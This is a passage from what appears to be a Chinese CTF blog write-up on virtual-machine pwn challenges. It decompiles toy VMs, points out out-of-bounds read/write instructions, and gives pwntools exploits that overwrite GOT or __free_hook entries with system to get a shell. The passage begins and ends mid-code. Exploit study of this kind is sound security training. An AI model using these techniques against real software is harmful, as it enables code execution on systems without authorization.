class="number">0x400</span>uLL);       <span class="comment">//存放临时数据，有点cache的味道 </span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your program name:"</span>);</span><br><span class="line">  my_read_((__int64)exec_name, <span class="number">0x20</span>u);  <span class="comment">//直接写数据到name处</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your instruction:"</span>);</span><br><span class="line">  my_read_((__int64)ptr, <span class="number">0x400</span>u);       <span class="comment">//先写到cache中</span></span><br><span class="line">  StoreOpcode(text_addr, ptr);          <span class="comment">//再存入代码段</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your stack data:"</span>);</span><br><span class="line">  my_read_((__int64)ptr, <span class="number">0x400</span>u);       <span class="comment">//先写到cache中</span></span><br><span class="line">  StroeStack(stack_addr, ptr);          <span class="comment">//再存入栈中</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)run((__int64)text_addr) )   <span class="comment">//模拟执行</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-------"</span>);  </span><br><span class="line">    <span class="built_in">puts</span>(exec_name);                             <span class="comment">//打印name</span></span><br><span class="line">    puts_stack(stack_addr);                      <span class="comment">//打印栈数据</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-------"</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your Program Crash :)"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  my_free((<span class="keyword">void</span> **)text_addr);</span><br><span class="line">  my_free((<span class="keyword">void</span> **)stack_addr);</span><br><span class="line">  my_free(data_addr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果只看上面，大概可以想到：</p><p>1、name = ”/bin/sh\x00”, 利用漏洞将puts@got改成system地址</p><p>2、打印栈数据可以泄露一些地址</p><p>下面来看一下stack、text、data是如何存放数据的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">section_info *__<span class="function">fastcall <span class="title">sub_4013B4</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  section_info *result; <span class="comment">// rax</span></span><br><span class="line">  section_info *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ptr = (section_info *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);   <span class="comment">//存放结构体</span></span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">8L</span>L * size);    <span class="comment">//存放数据</span></span><br><span class="line">  <span class="keyword">if</span> ( s )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">8L</span>L * size);</span><br><span class="line">    ptr-&gt;section_ptr = (__int64)s;</span><br><span class="line">    ptr-&gt;size = size;     </span><br><span class="line">    ptr-&gt;numb = <span class="number">-1</span>;</span><br><span class="line">    result = ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构体如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00000000 section_info    struc ; (sizeof=0x10, mappedto_6)</span><br><span class="line">00000000 section_ptr     dq ?</span><br><span class="line">00000008 size            dd ?</span><br><span class="line">0000000C idx             dd ?</span><br><span class="line">00000010 section_info    ends</span><br></pre></td></tr></table></figure><p>下面再看一下两个操作数据的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall Get(section_info *text_addr, _QWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  if ( !text_addr )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( text_addr-&gt;numb == -1 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *a2 = *(_QWORD *)(text_addr-&gt;section_ptr + 8LL * text_addr-&gt;numb--);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Get(addr, a): 从addr从取数据到a中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall StoreInSection(section_info *a1, __int64 data)</span><br><span class="line">&#123;</span><br><span class="line">  int idx; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( !a1 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  idx = a1-&gt;numb + 1;                          </span><br><span class="line">  if ( idx == a1-&gt;size )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *(_QWORD *)(a1-&gt;section_ptr + 8LL * idx) = data;</span><br><span class="line">  a1-&gt;numb = idx;</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StoreInSection(a1, data)：将data存放到a中</p><h4 id="指令功能"><a href="#指令功能" class="headerlink" title="指令功能"></a>指令功能</h4><p>共有7个指令：push、pop、add、sub、mul、div、load、save</p><p>push：从stack_addr中取出数据放进data_addr中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">do_PUSH</span><span class="params">(section_info *data_addr, section_info *stack_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(stack_addr, &amp;v3) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)StoreInSection(data_addr, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pop：从data_addr中取出数据放进stack_addr中，与push刚好相反</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">do_POP</span><span class="params">(section_info *data_addr, section_info *stack_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v3) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)StoreInSection(stack_addr, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add：从data_addr中取出两个数据相加再存入data_addr；sub、mul、div类似</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">do_ADD</span><span class="params">(section_info *data_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v2) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v3) )</span><br><span class="line">    result = StoreInSection(data_addr, v3 + v2);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>load：从data_addr中取出数据作为data_addr的索引，再将该索引指向的数据存放到data_addr中，由于没有进行索引的判断，因此可以造成越界读</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">do_LOAD</span><span class="params">(section_info *data_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 idx; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;idx) )</span><br><span class="line">    result = StoreInSection(data_addr, *(_QWORD *)(data_addr-&gt;section_ptr + <span class="number">8</span> * (data_addr-&gt;numb + idx)));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>save：从data_addr中取出两个数据，将第二个数据写入第一个数据相关的索引中，存在越界写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">do_SAVE</span><span class="params">(section_info *data_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 value; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;v2) || !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)Get(data_addr, &amp;value) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)(<span class="number">8</span> * (data_addr-&gt;numb + v2) + data_addr-&gt;section_ptr) = value;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如：利用save将data_addr覆盖成0x400</p><p><img alt="" data-src="/2020/04/10/虚拟指令集pwn/1.png" class="lazyload"></p><p>利用思路：</p><p>1、先把got表写入data_addr-&gt;section_ptr处：push got_addr；push -3；save</p><p>2、load put@got，加上它与system@got的偏移：push 5；load；push offset；add</p><p>3、将该地址写入put@got的地址处：push 5；save</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">(s=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,s)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">ins = <span class="string">"push push save push load push add push save"</span></span><br><span class="line">p.sendlineafter(<span class="string">'instruction:\n'</span>, ins)</span><br><span class="line"></span><br><span class="line">offset = -(libc.sym[<span class="string">'puts'</span>] - libc.sym[<span class="string">'system'</span>])</span><br><span class="line">got_addr = <span class="number">0x404000</span></span><br><span class="line">data = [got_addr,<span class="number">-3</span>,<span class="number">5</span> ,offset ,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    payload+=str(i)+<span class="string">" "</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gd('b *0x401A75\nb *0x4019C7\nb*0x401A5D\n')</span></span><br><span class="line">p.sendlineafter(<span class="string">'data:\n'</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h3><p>来源：<a href="https://adworld.xctf.org.cn/media/uploads/task/f73efe174bb6478781a72677aea0235d.zip" target="_blank" rel="noopener">gxzyCTF-EasyVM</a></p><p>checksec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/shared/vmpwn/easyVM/attachment/EasyVM&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h4 id="程序逻辑-1"><a href="#程序逻辑-1" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST2C_4</span></span><br><span class="line">  _DWORD *ptr; <span class="comment">// [esp+18h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+ACh] [ebp+7Ch]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  ptr = sub_DD5();    <span class="comment">//定义一些寄存器</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( menu() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:                    </span><br><span class="line">        buf = <span class="built_in">malloc</span>(<span class="number">0x300</span>u); </span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x2FF</span>u);  <span class="comment">//读入指令</span></span><br><span class="line">        ptr[<span class="number">8</span>] = buf;          <span class="comment">//地址存放在ptr[8]中</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !ptr )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        vm(ptr);               <span class="comment">//定义了指令集</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !ptr )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">free</span>((<span class="keyword">void</span> *)ptr[<span class="number">10</span>]);</span><br><span class="line">        <span class="built_in">free</span>(ptr);             <span class="comment">//有点东西</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Maybe a bug is a gif?"</span>);</span><br><span class="line">        dword_305C = v5;       <span class="comment">//程序的地址</span></span><br><span class="line">        ptr[<span class="number">8</span>] = &amp;unk_3020;    <span class="comment">//存入一些指令</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Zzzzzz........"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Are you kidding me ?"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到case 3，大概可以想到要把free(ptr)修改成system(“/bin/sh”)</p><p>先来看指令集，指令集只是定义了一些运算，下面介绍几个主要的</p><p>0x80：以下一个指令为索引idx，把下2到5个字节为值传入寄存器a1[idx]</p><p>例如：’\x80\x02\x00\x96\xF3\x78’就是a1[2] = 0x78F39600</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x80</span>u )</span><br><span class="line">&#123;</span><br><span class="line">  a1[sub_9C3((<span class="keyword">int</span>)a1, <span class="number">1u</span>)] = *(_DWORD *)(a1[<span class="number">8</span>] + <span class="number">2</span>);</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x09与0x11：把dword_305C中的值打印出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">9</span> )</span><br><span class="line">&#123;</span><br><span class="line">  a1[<span class="number">1</span>] = dword_305C;</span><br><span class="line">  ++a1[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x11</span> )              </span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, a1[<span class="number">1</span>]);</span><br><span class="line">  ++a1[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x53与0x54: 输出一个字节和输入一个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x53</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">putchar</span>(*(<span class="keyword">char</span> *)a1[<span class="number">3</span>]);</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x54</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = (_BYTE *)a1[<span class="number">3</span>];</span><br><span class="line">  *v1 = getchar();</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x71接0x76：相当于a1[3] = <em>(_DWORD </em>)(a1[8] + 1);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x71</span> )</span><br><span class="line">&#123;</span><br><span class="line">  a1[<span class="number">6</span>] -= <span class="number">4</span>;</span><br><span class="line">  *(_DWORD *)a1[<span class="number">6</span>] = *(_DWORD *)(a1[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x76</span> )</span><br><span class="line">&#123;</span><br><span class="line">  a1[<span class="number">3</span>] = *(_DWORD *)a1[<span class="number">6</span>];</span><br><span class="line">  *(_DWORD *)a1[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">6</span>] += <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实弄清楚&amp;unk_3020中的指令就差不多了，该指令首先给dword_305C赋值，然后对该值进行一系列运算并打印出来，根据该运算特征可以发现是MT19937随机数算法，可以利用Z3约束器进行求解（参考<a href="http://ctf.njupt.edu.cn/382.html#EasyVM）" target="_blank" rel="noopener">http://ctf.njupt.edu.cn/382.html#EasyVM）</a></p><p>实际上可以不用管这个密文，我们只需要dword_305C已经赋值，然后运行<code>&quot;\x09\x11\x99&quot;</code>即可</p><p>这道题可以有多种方法构造任意地址读写</p><p>1、利用<code>&quot;\x80\x03&quot;</code></p><p>2、利用<code>&quot;\x71\x76&quot;</code></p><p>具体攻击方法如下：</p><p>1、泄露程序基址，得到malloc@got地址</p><p>2、泄露malloc的地址，得到libc基址，从而计算free_hook地址和system地址</p><p>3、将”/bin/sh\x00”写入ptr，将system@addr写入free_hook</p><p>4、case 3 getshell</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">"./EasyVM"</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce</span><span class="params">(ins)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.send(ins)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_one</span><span class="params">(addr)</span>:</span></span><br><span class="line">    ins = <span class="string">'\x80\x03'</span>+p32(addr)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">1</span>)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">2</span>)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">3</span>)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x99'</span></span><br><span class="line">    produce(ins)</span><br><span class="line">    start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_one</span><span 